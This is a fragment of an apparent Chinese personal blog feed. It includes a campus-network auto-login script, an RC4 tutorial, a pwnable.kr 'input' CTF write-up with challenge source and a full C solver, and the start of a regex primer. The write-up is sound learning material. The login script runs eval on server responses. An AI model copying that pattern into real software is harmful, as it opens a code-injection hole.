class="string">&#x27;windows&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;double_stack&#x27;</span>:<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;_&#x27;</span>:<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(srun_portal_params)</span><br><span class="line">srun_portal_res=requests.get(srun_portal_api,params=srun_portal_params,headers=header)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">in</span> srun_portal_res.text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;登陆成功&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">error_msg=<span class="built_in">eval</span>(re.search(<span class="string">&#x27;\((.*?)\)&#x27;</span>,srun_portal_res.text).group(<span class="number">1</span>))</span><br><span class="line"><span class="comment">#输出错误信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;error_type:&#x27;</span>+error_msg[<span class="string">&#x27;error&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(error_msg[<span class="string">&#x27;error_msg&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">global</span> username,password</span><br><span class="line">username=<span class="string">&quot;&quot;</span><span class="comment">#你的用户名和密码，注意加上@cmcc(移动) 或者@chinanet(电信)，联通是啥就忘了。。</span></span><br><span class="line">password=<span class="string">&quot;&quot;</span></span><br><span class="line">init_getip()</span><br><span class="line">get_token()</span><br><span class="line">do_complex_work()</span><br><span class="line">login()</span><br></pre></td></tr></table></figure><p>本学生来自嘉兴学院，同校校友可以换上自己的用户名和密码直接用，如果不是的话把url替换一下应该问题也不大。</p><p>以后上网终于不用再输用户名密码了，只能说爽(狗头</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学校更新了校园网之后，用的宽带就需要每天早上进行一遍网页登录才能有网，非常的麻烦，我就萌生出了想写个模拟登录的脚本的想法。&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>RC4加密的学习</title>
    <link href="http://example.com/2021/11/27/RC4%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/11/27/RC4%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-11-27T02:00:00.000Z</published>
    <updated>2021-11-27T14:12:31.491Z</updated>
    
    <content type="html"><![CDATA[<p>最近有点颓废了，想学内核很难进行，逆向光刷题看着也很难，pwn刷题就是处于刷的感觉似曾相识，没有一点提升的感觉，所以我决定先攻一下逆向，把常见加解密算法先学了，今天先来这个RC4</p><span id="more"></span><h2 id="RC4加密"><a href="#RC4加密" class="headerlink" title="RC4加密"></a>RC4加密</h2><p>我初识RC4是在国赛，记得很清楚的一点就是不停地取模256，那题当时靠着网上资料勉强算过去了。但是还是想系统地学一下，网上教程千篇一律，我决定自己模拟一边它的算法过程然后再理解一遍。</p><p>既然是加密，脱离不了三个概念，明文，密文，密钥。RC4是对称加密，我也才知道，一直以为是不可逆的那种hash加密，所以既然它是对称加密，那么对于加密和解密过程，他们所用的密钥相同。它生成密钥的过程如下：</p><p>生成密钥需要一个长度不多于256长度的字符串作为种子生成随机密钥，这是我自己的理解，因为它确实给我的感觉就是这样的随机。它初始生成了一个长度为256的S串，初始S[i]=i，后面根据用字符串种子作为一个变换规则T，交换S密钥里的各个值，这样的交换好处在于我们可以保证S串密钥为一个双射（满足单射和满射，这个概念高中应该讲过，不赘述）。然后给的一个字符串种子呢，就会被放进T中，T的长度也为256，如果所给字符串种子长度小于256，则会进行轮换，直到它长度严格等于256为止。举个例子，在RC4加密中，如果我给定字符串种子为abcd，那么T的值将是[‘a’,’b’,’c’,’d’,’a’,’b’,’c’,’d’,’a’,’b’,’c’,’d’,……’a’,’b’,’c’,’d’]，对于任意0&lt;=i&lt;256，</p><p>T[i]=Seed[i%len(Seed)]</p><p>那么有了这个T之后呢，我们可以开始进行密钥变换了，做以下规则的变换(字符串均转成ASCII码计算)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j=(j+S[i]+T[i])%<span class="number">256</span></span><br><span class="line">    swap(S[i],S[j])</span><br></pre></td></tr></table></figure><p>从这一步我们也可以看出来，S初值我们都是知道的，T在确定了字符串种子之后也是确定的，那么由此可以算出密钥S。我们平时习惯说那个字符串是密钥，但是从这里可以看出来，字符串只是用来确定密钥的，因为在这之后，T和给的字符串已经都用不到了。所以这也是我为什么说那个字符串是种子而不是密钥，因为它没有参与加密的运算，我们刚刚算的那么快乐压根都没有出现明文这种，没有明文怎么能算加密呢对吧。</p><p>最后我们看看它是如何加密的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+S[i])%<span class="number">256</span></span><br><span class="line">    c[k]=m[k]^S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>有木有感觉很熟悉，跟前面生成密钥的算法差不多。这个算法如果不了解RC4，直接逆上去的话，怕能直接破防。我有体会我给你们演示一遍，首先i初值知道，c[k]知道，然后要算明文的话m[k]=c[k]^S[(S[i]+S[j])%256]然后呢，i最终值不知道，j最终值不知道，就，时间静止了呗。但是其实它最后就做一个异或，就不用管它了呗，跟它一样从头往后再异或一遍，不就回来了吗。这也就是它为什么也叫对称加密，它不仅密钥用的是一个，加密解密算法都是一样的，没错，加密即解密。RC4解密只需要对密文再加密一次就可以得到明文了。</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">m=<span class="string">&#x27;I love xia0ji233&#x27;</span></span><br><span class="line">S=[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">key=<span class="string">&#x27;cat flag&#x27;</span></span><br><span class="line">T=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> S:</span><br><span class="line">    T.append(key[i%<span class="built_in">len</span>(key)])</span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j=(j+S[i]+<span class="built_in">ord</span>(T[i]))%<span class="number">256</span></span><br><span class="line">    t=S[i]</span><br><span class="line">    S[i]=S[j]</span><br><span class="line">    S[j]=t</span><br><span class="line"></span><br><span class="line">i,j=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+S[i])%<span class="number">256</span></span><br><span class="line">    t=<span class="built_in">ord</span>(m[k])^S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(t)[<span class="number">2</span>:],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#2ef1bae658e6e938ca2af63e95e372d</span></span><br></pre></td></tr></table></figure><p>把它放到CyberChef中加密发现结果一致，本次可能说就是学了个寂寞吧，因为我最后只要知道它加密解密算法一致这个结论就可以了。但是最重要的还是学会了如何分辨这样的加解密以及它加解密的一个特性，也算小有成就吧，瞬间不emo了哈哈哈哈。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近有点颓废了，想学内核很难进行，逆向光刷题看着也很难，pwn刷题就是处于刷的感觉似曾相识，没有一点提升的感觉，所以我决定先攻一下逆向，把常见加解密算法先学了，今天先来这个RC4&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="crypto" scheme="http://example.com/categories/ctf/crypto/"/>
    
    
  </entry>
  
  <entry>
    <title>pwnable input writeup</title>
    <link href="http://example.com/2021/11/23/pwnable_input/"/>
    <id>http://example.com/2021/11/23/pwnable_input/</id>
    <published>2021-11-23T02:00:00.000Z</published>
    <updated>2021-11-23T04:53:35.245Z</updated>
    
    <content type="html"><![CDATA[<p>真的推荐学linux C的IO一定得做做这个，真的能学到很多。</p><span id="more"></span><p>连接远程服务器把源码下下来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here&#x27;s your flag</span></span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码大概意思就是给程序五种输入方法，如果程序从指定方法获得了对应的值那么这一关被判正确并且进入下一关，过去五关就能拿到flag。</p><p>第一关是命令行输入，要求命令行有100个参数，然后argv[‘A’]=”\x00”，argv[‘B’]=”\x20\x0a\x0d”，那就给命令行一百个参数，然后满足一下对应的要求即可，这里我们可以选择用execve去执行这个程序。然后程序构造命令行的参数传给第二个参数就可以通过第一关了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *arg[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        arg[i]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        *arg[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arg[<span class="number">100</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>);</span><br><span class="line">    execve(<span class="string">&quot;./input&quot;</span>,arg,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行就可以发现第一关过去了，这个源码可以放在自己电脑编译然后测试哦，等到自己能打通了再去考虑服务器的环境。</p><p>第二关虽然是stdio，但是它这里不仅要求读取特殊字节，还要从stderr中读入特定字节。这里卡了有点久，最后还是google了一下才得到的一个好方法，这里我也贴一下这位师傅这篇博客，我做这个也是参照这位师傅的博客做的–&gt;<a href="https://r00tk1ts.github.io/2018/03/06/input/%EF%BC%8C%E7%89%B9%E6%AD%A4%E6%84%9F%E8%B0%A2%EF%BC%81">https://r00tk1ts.github.io/2018/03/06/input/，特此感谢！</a></p><p>这里呢选择fork一个子进程，然后父子进程用管道通信，父进程把管道接口定向到stdin和stderr后去执行input。子进程通过管道给父进程发送数据，然后父进程就能从stdin和stderr中得到数据了。</p><p>第三关也比较简单，从环境变量中获得对应数据。环境变量其实跟命令行参数输入差不多，execve第三个参数就是环境变量，传入一个指针数组，然后里面给一个xxx=yyy，那么它从环境变量中get(xxx)就会获得yyy。</p><p>第四个就更简单了，它从文件读你就对应写一个文件给它好了。</p><p>第五个稍微有点东西，是关于socket编程的，基本上也可以超，但是也遇到诸多问题，我一个exp并不能打通，我运行一个exp之后会被挂起，我再运行一个exp才能让第一个exp getflag，盲猜是它数据没接收到，我测试之后发现sleep也不管用，但是这一关已经能打过去了。</p><p>但是由于pwnable服务器的特殊机制，我们home 目录没有写的权限，所以得去寻找我们文件能落地的地方，那就是/tmp目录，这里的目录我们有写的权限，但是没有读的权限，所以我们在里面新建一个自己的文件夹，然后把input可执行文件和flag文件链接到这个目录来，最后上传exp执行就可以拿到flag了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *fd=fopen(<span class="string">&quot;\x0a&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    fwrite(buf,<span class="number">1</span>,<span class="number">4</span>,fd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pipe_stdin[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;,pipe_stderr[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *arg[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">char</span> *env[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        arg[i]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        *arg[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arg[<span class="number">100</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;C&#x27;</span>],<span class="string">&quot;55555&quot;</span>);</span><br><span class="line">    env[<span class="number">0</span>]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(env[<span class="number">0</span>],<span class="string">&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;</span>);</span><br><span class="line">    env[<span class="number">1</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    pipe(pipe_stdin);</span><br><span class="line">    pipe(pipe_stderr);</span><br><span class="line">    <span class="keyword">int</span> p=fork();</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>)&#123;</span><br><span class="line">        write(pipe_stdin[<span class="number">1</span>],<span class="string">&quot;\x00\x0a\x00\xff&quot;</span>,<span class="number">4</span>);</span><br><span class="line">        write(pipe_stderr[<span class="number">1</span>],<span class="string">&quot;\x00\x0a\x02\xff&quot;</span>,<span class="number">4</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        dup2(pipe_stdin[<span class="number">0</span>],<span class="number">0</span>);</span><br><span class="line">        dup2(pipe_stderr[<span class="number">0</span>],<span class="number">2</span>);</span><br><span class="line">        execve(<span class="string">&quot;./input&quot;</span>,arg,env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    <span class="keyword">int</span> sockfd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>;</span></span><br><span class="line">    sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    saddr.sin_port = htons(<span class="number">55555</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;connenct\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(connect(sockfd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Cannot connect to server!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(sockfd, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    close(sockfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag:<code>Mommy! I learned how to pass various input in Linux :)</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;真的推荐学linux C的IO一定得做做这个，真的能学到很多。&lt;/p&gt;</summary>
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    <category term="IO" scheme="http://example.com/categories/linux/IO/"/>
    
    
  </entry>
  
  <entry>
    <title>正则表达式的使用</title>
    <link href="http://example.com/2021/11/19/Re/"/>
    <id>http://example.com/2021/11/19/Re/</id>
    <published>2021-11-19T02:00:00.000Z</published>
    <updated>2021-11-20T14:37:28.902Z</updated>
    
    <content type="html"><![CDATA[<p>最近在和战队一起的比赛中又出现了诸多想要学习的知识点，那就是re和QRcode，今天先学一下这个正则吧。</p><span id="more"></span><p>那么我已开始接触正则呢，应该是在学爬虫的时候，因为当时爬虫学的不太好也就没有接着学正则匹配。后来在换了linux系统之后经常会用到一个很有用的东西，那就是|grep。不得不说这个在找东西的时候真的是很有用的，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ls -l | grep &quot;&quot;</span><br></pre></td></tr></table></figure><p>那么本次和Nepnep战队参加xctf分区赛也是有一道修复二维码的题目，当时师傅们可能有些点没注意到，导致最后修复的二维码多达16000的扫描结果。</p><p><img src="/2021/11/19/Re/1.png" alt="1"></p><p>得到结果之后本以为要经历漫长的人工过滤，可是咱们战队的一位爷爷直接solved，而这位爷爷就是直接用了正则匹配。</p><p><img src="/2021/11/19/Re/2.png" alt="2"></p><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>正则表达式（英语：Regular Expression，常简写为regex、regexp或RE），又称正则表示式、正则表示法、规则表达式、常规表示法，是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。</p><p>许多程序设计语言都支持利用正则表达式进行字符串操作。例如，在Perl中就内建了一个功能强大的正则表达式引擎。正则表达式这个概念最初是由Unix中的工具软件（例如sed和grep）普及开的。</p><p>以上来自维基百科。</p><h3 id="转义符"><a href="#转义符" class="headerlink" title="转义符"></a>转义符</h3><p>右斜杠(\)老转义符了，在右斜杠之后的一个字将会带有特殊含义，如果要匹配右斜杠则需要双写。</p><h3 id="通配符"><a href="#通配符" class="headerlink" 